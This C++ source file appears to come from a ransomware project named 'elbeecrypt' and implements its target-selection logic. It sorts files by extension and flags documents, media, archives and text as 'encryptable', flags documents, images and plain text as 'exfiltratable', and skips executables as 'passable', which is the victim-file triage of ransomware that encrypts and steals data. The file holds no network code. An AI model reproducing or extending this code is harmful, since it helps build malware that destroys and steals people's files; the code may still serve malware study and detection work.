#include <algorithm>
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/common/utils/string.hpp"

/** Impl of extensions.hpp */
namespace elbeecrypt::common::targets::Extensions {
	/** Impl of getCategory(string). */
	const Category getCategory(const std::string& extension){
		//Isolate the extension if necessary
		std::string isolatedExt = isolateExtension(extension);

		//Check each category vector for the extension
		if(utils::Container::contains(extgroup::Archive::values, isolatedExt)) return Category::ARCHIVE;
		if(utils::Container::contains(extgroup::Audio::values, isolatedExt)) return Category::AUDIO;
		if(utils::Container::contains(extgroup::Document::values, isolatedExt)) return Category::DOCUMENT;
		if(utils::Container::contains(extgroup::Executable::values, isolatedExt)) return Category::EXECUTABLE;
		if(utils::Container::contains(extgroup::Image::values, isolatedExt)) return Category::IMAGE;
		if(utils::Container::contains(extgroup::Misc::values, isolatedExt)) return Category::MISC;
		if(utils::Container::contains(extgroup::Plain::values, isolatedExt)) return Category::PLAIN;
		if(utils::Container::contains(extgroup::Video::values, isolatedExt)) return Category::VIDEO;

		//Return undefined by default
		return Category::UNDEFINED;
	}

	/** Impl of isEncryptable(Category). */
	bool isEncryptable(const Category& category){
		return	category == Category::ARCHIVE || category == Category::AUDIO || category == Category::DOCUMENT || 
				category == Category::IMAGE || category == Category::MISC || category == Category::PLAIN || category == Category::VIDEO;
	}

	/** Impl of isEncryptable(string). */
	bool isEncryptable(const std::string& extension){
		return isEncryptable(getCategory(extension));
	}

	/** Impl of isEncryptable(path). */
	bool isEncryptable(const fs::path& path){
		return isEncryptable(path.string());
	}

	/** Impl of isExfiltratable(Category). */
	bool isExfiltratable(const Category& category){
		return category == Category::DOCUMENT || category == Category::IMAGE || category == Category::PLAIN;
	}

	/** Impl of isExfiltratable(string). */
	bool isExfiltratable(const std::string& extension){
		return isExfiltratable(getCategory(extension));
	}

	/** Impl of isExfiltratable(path). */
	bool isExfiltratable(const fs::path& path){
		return isExfiltratable(path.string());
	}

	/** Impl of isolateExtension(path). */
	std::string isolateExtension(const fs::path& path){
		return isolateExtension(path.string());
	}

	/** Impl of isolateExtension(string). */
	std::string isolateExtension(const std::string& path){
		//Get the indices of the last period, last forward slash, and last backward slash
		int lastPerInd = utils::String::lastIndexOf(path, '.');
		int lastBSlash = utils::String::lastIndexOf(path, '\\');
		int lastFSlash = utils::String::lastIndexOf(path, '/');

		//Check if the string contains a period or a path separator
		if(lastPerInd != -1 || lastBSlash != -1 || lastFSlash != -1){
			//Clone the input string to maintain immutability
			std::string extension(path);

			//If the string has a period in it, substring to the last index of that period
			if(lastPerInd != -1){
				return extension.substr(lastPerInd + 1, extension.length() - 1);
			}
			else {
				//Substring to the last index of the path separator
				return extension.substr(std::max(lastBSlash, lastFSlash) + 1, extension.length() - 1);
			}
		}
		else {
			//Simply return the input string, as it is likely not a path or a complete filename
			return utils::String::toLowercase(path);
		}
	}

	/** Impl of isPassable(Category). */
	bool isPassable(const Category& category){
		return category == Category::EXECUTABLE;
	}

	/** Impl of isPassable(string). */
	bool isPassable(const std::string& extension){
		return isPassable(getCategory(extension));
	}

	/** Impl of isPassable(path). */
	bool isPassable(const fs::path& path){
		return isPassable(path.string());
	}
}